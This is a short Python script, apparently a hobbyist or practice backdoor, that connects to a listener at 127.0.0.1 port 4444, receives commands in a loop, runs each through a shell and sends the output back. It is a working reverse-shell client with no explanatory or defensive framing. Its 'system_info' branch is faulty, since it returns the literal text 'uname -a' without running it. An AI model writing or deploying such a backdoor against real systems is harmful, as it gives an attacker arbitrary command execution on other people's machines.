
import socket
import subprocess
import time
import os

os.system('cls' if os.name == 'nt' else 'clear')

ip = '127.0.0.1'
port = 4444

s = socket.socket(socket.AF_INET,
        socket.SOCK_STREAM)

s.setsockopt(socket.SOL_SOCKET,
        socket.SO_REUSEADDR,
        1)

s.connect((ip,
        port))

print('[+] Starting Setup Bottom...')

while True:
        cmd = s.recv(1024)
        if cmd == b'exit':
                print("[+] Session Close")
                s.close()
                break

        elif cmd == b'system_info':

                s.send(b'uname -a')

        else:
                proc = subprocess.Popen(cmd,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE)

                output = proc.stdout.read() + proc.stderr.read()

                s.send(output)
